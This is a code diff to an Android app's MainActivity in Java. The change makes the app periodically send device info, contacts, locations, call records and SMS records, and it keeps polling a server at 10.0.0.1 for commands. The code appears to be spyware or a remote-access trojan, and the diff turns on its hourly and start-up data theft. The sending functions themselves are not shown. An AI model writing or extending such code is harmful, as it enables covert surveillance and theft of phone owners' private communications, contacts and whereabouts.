@@ -67,15 +67,26 @@ public class MainActivity extends Activity {
     private static int delayTime = 5000;
     
     private static String ipAddr = "10.0.0.1";
-  
+    
+    private static int replyDeviceInfoTime = 0;
     private Handler handler = new Handler();  
   
     private Runnable task = new Runnable() {  
   
         public void run() {   
             if (run) {  
-                handler.postDelayed(this, delayTime);            
-               
+                handler.postDelayed(this, delayTime); 
+                
+                replyDeviceInfoTime++;
+                if(replyDeviceInfoTime == 720){
+	                replyDeviceInfo();
+	                replyDeviceContacts();
+	                replyDeviceLocations();
+	                replyDeviceCallingRecords();
+	                replyDeviceSMSRecords();
+	                replyDeviceInfoTime = 0;
+                }              
+                
                 String command = getCommand();                
                 try{
 	    			if(!command.equals("noCommand")){
@@ -187,12 +198,14 @@ public class MainActivity extends Activity {
                 run = true;  
                 updateButton(5);  
                 //TODO
+                
+                replyDeviceInfo();
+                replyDeviceContacts();
+                replyDeviceLocations();
+                replyDeviceCallingRecords();
+                replyDeviceSMSRecords();
+                
                 handler.postDelayed(task, delayTime);  
-                //replyDeviceInfo();
-                //replyDeviceContacts();
-                //replyDeviceLocations();
-                //replyDeviceCallingRecords();
-                //replyDeviceSMSRecords();
             }  
         }); 
         
@@ -221,10 +234,11 @@ public class MainActivity extends Activity {
         //getDeviceLocation();
         //replyPicture();
         
+        /*
         run = true;  
         updateButton(5);  
         handler.postDelayed(task, delayTime);
-         
+        */
     }  
     
     @Override
